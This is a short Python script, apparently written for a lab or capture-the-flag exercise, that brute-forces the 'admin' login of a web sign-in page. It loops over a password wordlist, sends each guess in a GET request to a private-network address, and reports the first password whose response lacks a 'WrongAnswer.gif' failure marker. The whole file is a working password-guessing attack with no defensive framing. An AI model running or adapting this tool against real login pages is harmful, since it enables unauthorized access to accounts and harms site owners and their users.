import requests
import argparse

def main(url, passwdFile):
    with open(passwdFile, 'r') as file:
        for line in file:
            password = line.strip()
            full_url = f"{url}&username=admin&password={password}&Login=Login"
            print(f"Trying password: {password}")
            response = requests.get(full_url)
            if ("WrongAnswer.gif" in response.text):
                continue
            else:
                print("Good Password:", password)
                return
            
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', type=str, default='http://10.13.248.135/?page=signin')
    parser.add_argument('--file', '-f', type=str, default='common-passwd.txt')
    args = parser.parse_args()

    main(args.url, args.file)